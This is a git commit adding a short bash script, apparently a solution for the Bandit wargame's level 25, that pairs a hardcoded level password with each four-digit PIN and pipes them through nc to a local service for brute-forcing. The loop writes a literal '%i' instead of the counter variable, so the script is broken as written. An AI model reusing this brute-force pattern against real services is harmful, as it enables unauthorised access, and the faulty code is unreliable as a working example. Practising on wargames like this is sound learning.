f4691a9aeb141c0d469c256f3bfb31cd7481e909
Denton <163344926+cDenton1@users.noreply.github.com>
2025-05-16 22:08:36 -0600

    Create Bandit25.sh

---
+++ otw-Bandit/Bandit25.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+for i in {0000..9999}
+do 
+        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 %i >> /tmp/dentontest/poss.txt
+done
+
+cat /tmp/dentontest/poss.txt | nc localhost 30002 > /tmp/dentontest/res.txt
